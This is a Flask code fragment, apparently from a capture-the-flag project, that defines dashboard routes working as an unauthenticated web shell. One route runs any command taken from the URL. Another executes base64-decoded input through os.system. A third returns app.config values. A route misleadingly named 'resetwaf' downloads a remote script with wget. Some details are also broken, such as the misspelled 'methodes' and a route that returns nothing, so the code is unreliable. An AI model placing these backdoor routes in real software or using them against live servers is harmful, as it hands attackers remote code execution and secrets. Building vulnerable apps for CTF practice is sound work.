...
@app.route("/cmd/<cmd>/<arg>", methods=['GET'])
def remotecmd(cmd,arg):
    result = subprocess.run([cmd,arg], stdout=subprocess.PIPE)
    return render_template("dashboard/index.html",title = cmd, content = result.stdout,id=1)
    
@app.route("/resetwaf/",methods=['GET'])
def resetwaf():
    remotecmd("wget","https://raw.githubusercontent.com/achahbi/CTF-Rouge/master/zipper.py")

@app.route("/flag/<cmd>/",methodes=['GET'])
def getFlag(cmd):
    return render_template("dashboard/index.html",title = cmd,content =app.config[cmd],id=1)
@app.route("/system/<cmd>", methods=['GET','POST'])
def systemCmd(cmd):
    os.system(base64.b64decode(cmd))
    return render_template("dashboard/index.html",title = cmd, content = base64.b64decode(cmd),id=1)
